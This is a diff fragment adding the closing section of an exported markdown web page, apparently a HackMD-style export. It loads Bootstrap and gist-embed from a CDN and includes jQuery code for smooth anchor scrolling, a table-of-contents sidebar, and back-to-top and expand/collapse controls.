+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.0/js/bootstrap.min.js" integrity="sha256-kJrlY+s09+QoWjpkOrXXwhxeaoDz9FW5SaxF8I0DibQ=" crossorigin="anonymous" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
+    <script>
+        var markdown = $(".markdown-body");
+        //smooth all hash trigger scrolling
+        function smoothHashScroll() {
+            var hashElements = $("a[href^='#']").toArray();
+            for (var i = 0; i < hashElements.length; i++) {
+                var element = hashElements[i];
+                var $element = $(element);
+                var hash = element.hash;
+                if (hash) {
+                    $element.on('click', function (e) {
+                        // store hash
+                        var hash = this.hash;
+                        if ($(hash).length <= 0) return;
+                        // prevent default anchor click behavior
+                        e.preventDefault();
+                        // animate
+                        $('body, html').stop(true, true).animate({
+                            scrollTop: $(hash).offset().top
+                        }, 100, "linear", function () {
+                            // when done, add hash to url
+                            // (default click behaviour)
+                            window.location.hash = hash;
+                        });
+                    });
+                }
+            }
+        }
+
+        smoothHashScroll();
+        var toc = $('.ui-toc');
+        var tocAffix = $('.ui-affix-toc');
+        var tocDropdown = $('.ui-toc-dropdown');
+        //toc
+        tocDropdown.click(function (e) {
+            e.stopPropagation();
+        });
+
+        var enoughForAffixToc = true;
+
+        function generateScrollspy() {
+            $(document.body).scrollspy({
+                target: ''
+            });
+            $(document.body).scrollspy('refresh');
+            if (enoughForAffixToc) {
+                toc.hide();
+                tocAffix.show();
+            } else {
+                tocAffix.hide();
+                toc.show();
+            }
+            $(document.body).scroll();
+        }
+
+        function windowResize() {
+            //toc right
+            var paddingRight = parseFloat(markdown.css('padding-right'));
+            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
+            toc.css('right', right + 'px');
+            //affix toc left
+            var newbool;
+            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
+            //for ipad or wider device
+            if (rightMargin >= 133) {
+                newbool = true;
+                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
+                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
+                tocAffix.css('left', left + 'px');
+            } else {
+                newbool = false;
+            }
+            if (newbool != enoughForAffixToc) {
+                enoughForAffixToc = newbool;
+                generateScrollspy();
+            }
+        }
+        $(window).resize(function () {
+            windowResize();
+        });
+        $(document).ready(function () {
+            windowResize();
+            generateScrollspy();
+        });
+
+        //remove hash
+        function removeHash() {
+            window.location.hash = '';
+        }
+
+        var backtotop = $('.back-to-top');
+        var gotobottom = $('.go-to-bottom');
+
+        backtotop.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToTop)
+                scrollToTop();
+            removeHash();
+        });
+        gotobottom.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToBottom)
+                scrollToBottom();
+            removeHash();
+        });
+
+        var toggle = $('.expand-toggle');
+        var tocExpand = false;
+
+        checkExpandToggle();
+        toggle.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            tocExpand = !tocExpand;
+            checkExpandToggle();
+        })
+
+        function checkExpandToggle () {
+            var toc = $('.ui-toc-dropdown .toc');
+            var toggle = $('.expand-toggle');
+            if (!tocExpand) {
+                toc.removeClass('expand');
+                toggle.text('Expand all');
+            } else {
+                toc.addClass('expand');
+                toggle.text('Collapse all');
+            }
+        }
+
+        function scrollToTop() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: 0
+            }, 100, "linear");
+        }
+
+        function scrollToBottom() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: $(document.body)[0].scrollHeight
+            }, 100, "linear");
+        }
+    </script>
+</body>
+
+</html>
